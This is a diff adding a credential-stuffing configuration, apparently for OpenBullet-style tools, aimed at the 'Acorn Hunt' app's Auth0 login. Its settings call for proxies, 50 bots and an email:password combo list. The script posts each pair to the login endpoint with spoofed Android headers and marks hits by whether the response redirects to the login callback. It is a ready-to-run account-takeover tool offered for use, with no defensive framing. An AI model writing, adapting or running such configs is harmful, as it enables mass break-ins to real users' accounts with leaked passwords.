@@ -1,0 +1,36 @@
+[SETTINGS]
+{
+  "Name": "Acorn Hunt",
+  "SuggestedBots": 50,
+  "LastModified": "2018-05-28T09:08:15.774298+00:00",
+  "AdditionalInfo": "Dun know if need proxies LULZ",
+  "Author": "Black Panther",
+  "Version": "1.0.0",
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+REQUEST POST "https://rewardable.auth0.com/usernamepassword/login" AutoRedirect=TRUE 
+  CONTENT "{\"client_id\":\"IASZ1ZybHQ4RdFTfKxApKo96iCwFKqFR\",\"redirect_uri\":\"rewardable://rewardable.auth0.com/android/com.rewardable.acornhunt/callback\",\"tenant\":\"rewardable\",\"response_type\":\"code\",\"connection\":\"Username-Password-Authentication\",\"username\":\"<USER>\",\"password\":\"<PASS>\",\"sso\":true,\"state\":\"tOP6T1xix9YcipSXr3oDsmU_tf3hMDbp\",\"_intstate\":\"deprecated\",\"_csrf\":\"Iob9BPm7-NC0Uy11I7r1ySUTPgytPSKQK1c0\",\"audience\":\"https://api.rewardable.com\",\"main_color\":\"#49B46C\",\"code_challenge_method\":\"S256\",\"initial_screen\":\"signUp\",\"code_challenge\":\"73LZjKjvPq9hs0l0bi_951VHNZmOdpAg6MyyugTbIIQ\",\"auth0Client\":\"eyJuYW1lIjoiQXV0aDAuQW5kcm9pZCIsInZlcnNpb24iOiIxLjExLjAifQ==\",\"scope\":\"openid user_metadata\",\"title\":\"Acorn Hunt\",\"protocol\":\"oauth2\"}" 
+  CONTENTTYPE "application/json" 
+  HEADER "Accept: */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Linux; Android 7.1.1; CPH1725 Build/N6F26Q) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.158 Mobile Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Failure OR 
+    KEY "invalid_user_password" 
+  KEYCHAIN Success OR 
+    KEY "https://rewardable.auth0.com/login/callback" 
